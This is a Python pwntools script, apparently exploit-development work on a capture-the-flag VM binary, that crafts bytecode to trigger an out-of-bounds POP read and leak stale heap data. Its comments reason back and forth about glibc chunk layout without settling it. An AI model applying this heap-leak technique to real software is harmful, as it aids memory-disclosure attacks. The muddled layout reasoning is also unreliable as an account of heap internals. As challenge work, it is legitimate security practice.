#!/usr/bin/env python3
"""
Test POP OOB read to leak heap metadata from adjacent chunks.
"""
from pwn import *

context.arch = 'amd64'
context.log_level = 'error'

def mov_reg_imm(reg, imm32):
    return bytes([0x41, reg]) + p32(imm32)

def pop_reg(reg):
    return bytes([0x03, reg])

def shr_reg_imm(reg, imm32):
    return bytes([0x4c, reg]) + p32(imm32)

def shl_reg_imm(reg, imm32):
    return bytes([0x4b, reg]) + p32(imm32)

def cmp_reg_reg(reg1, reg2):
    return bytes([0x2d, reg1, reg2])

def jne_reg(reg):
    return bytes([0x10, reg])

def hlt():
    return bytes([0x00])

def trigger_illegal():
    return bytes([0xFF])

def test_bit_at_addr(read_addr, bit_position, expected_bit):
    """Test if bit at (read_addr + 3)[bit_position] equals expected_bit."""
    code = b''
    
    # Set SP to read_addr + 0xFF (to trigger OOB read)
    # Actually, SP is used directly - let me reconsider
    # When SP & 0xFF = 0xFF, POP reads from page[0x103..0x106]
    # which is 3 bytes into the next chunk's prev_size
    
    # Wait, I need to understand where this actually reads from.
    # The page is 0x104 bytes. The heap chunk is 0x110 bytes.
    # So:
    #   chunk header: 8 bytes (prev_size + size)
    #   page data: 0x104 bytes (usable)
    #   padding: 0x110 - 8 - 0x104 = 4 bytes
    #
    # So page[0x103] is at offset 8+0x103 = 0x10B from chunk start
    # page[0x104] is at offset 8+0x104 = 0x10C (padding)
    # page[0x107] is at offset 8+0x107 = 0x10F (last byte of padding)
    # Next chunk starts at offset 0x110
    
    # Actually, when we read page[0x103..0x106]:
    # - page[0x103] is within page (last byte of page data)
    # - page[0x104..0x106] are within padding, NOT in next chunk
    
    # Let me recalculate. malloc(0x104) gives us 0x108 usable (rounded up).
    # The chunk size would be 0x110.
    # So chunk layout:
    # offset 0x00: prev_size (8 bytes)
    # offset 0x08: size (8 bytes)
    # offset 0x10: usable data (0x108 bytes = up to offset 0x118)
    # Next chunk at offset 0x110
    #
    # But wait, in the code:
    # malloc(0x104) -> returns ptr to usable area (offset 0x10 from chunk)
    # page[0] is at the returned ptr
    # page[0x103] is at ptr+0x103
    # ptr+0x104 is still within usable (since usable is 0x108)
    # 
    # Hmm, the 0x104 usable + 0xC metadata = 0x110... 
    # Actually glibc chunk overhead is 0x10 (prev_size + size) for 64-bit
    # 0x104 + 0x10 = 0x114, rounded to 0x120
    # Let me check chunk size...
    
    # Actually, I need to verify the exact layout by testing
    
    # For now, let me try reading at SP=0xFF which reads page[0x103..0x106]
    # If there's adjacent data, we can leak it
    
    # Set SP so that (SP & 0xFF) == 0xFF
    # SP is the full address used to locate the page. Let's use SP=0xFF
    
    code += mov_reg_imm(15, 0xFF)  # SP = 0xFF
    
    # Allocate the page by first reading/writing to address 0xFF
    # We need to PUSH something first to allocate the page
    code += mov_reg_imm(0, 0x41414141)  # r0 = 0x41414141
    code += bytes([0x02, 0])  # PUSH r0 to address 0xFF
    
    # Now pop at address 0xFF - this should read our pushed value
    # But since we pushed at 0xFF, we read back the same
    code += pop_reg(1)  # r1 = popped value
    
    # The page at 0xFF should have our 0x41414141 at the last 4 bytes
    # and potentially garbage in the OOB area
    
    # Actually wait - PUSH at SP=0xFF writes to page[0x103..0x106] OOB!
    # Then POP reads the same OOB location
    # So we're writing and reading the same OOB location
    
    # To leak, we need to:
    # 1. NOT write first (let the OOB area have stale heap data)
    # 2. Just POP to read the stale data
    
    # BUT! Pages are allocated on first access. When we POP at SP=0xFF,
    # it first allocates the page (if not present), then reads.
    # The question is: does allocation zero the data?
    
    # From analysis: page data is NOT zeroed! get_page doesn't memset.
    # So we might read stale heap data!
    
    code = b''
    # First, allocate several pages to get some heap activity
    for i in range(5):
        code += mov_reg_imm(15, i * 0x100)
        code += mov_reg_imm(0, 0x42424242 + i)
        code += bytes([0x02, 0])  # PUSH to allocate pages
    
    # Now allocate page at 0x500 and immediately POP from it at offset 0xFF
    code += mov_reg_imm(15, 0x5FF)  # SP = 0x5FF, so page 0x500 at offset 0xFF
    code += pop_reg(0)  # POP into r0 - reads potentially uninitialized data!
    
    # Now r0 has whatever was in that heap memory
    # Let's test a specific bit
    
    # Shift to isolate the bit we want
    if bit_position > 0:
        code += shl_reg_imm(0, 31 - bit_position)
    code += shr_reg_imm(0, 31)
    
    # Compare with expected
    code += mov_reg_imm(1, expected_bit)
    code += cmp_reg_reg(0, 1)
    
    # Jump to HLT if equal
    current = len(code)
    hlt_offset = current + 6 + 2 + 1
    code += mov_reg_imm(2, hlt_offset)
    code += jne_reg(2)
    code += trigger_illegal()
    code += hlt()
    
    return code

def main():
    print("[*] Testing POP OOB read for heap leak...")
    
    # Try to leak a byte from uninitialized heap
    code = test_bit_at_addr(0x5FF, 0, 1)
    
    p = process(['./mqda'])
    p.recvuntil(b'Code Address> ')
    p.sendline(b'0')
    p.recvuntil(b'Code Length> ')
    p.sendline(str(len(code)).encode())
    p.recvuntil(b'Code> ')
    p.send(code)
    p.recvuntil(b'Entry IP> ')
    p.sendline(b'0')
    
    output = p.recvall(timeout=2)
    print(f"[*] Output: {output}")
    p.close()

if __name__ == '__main__':
    main()
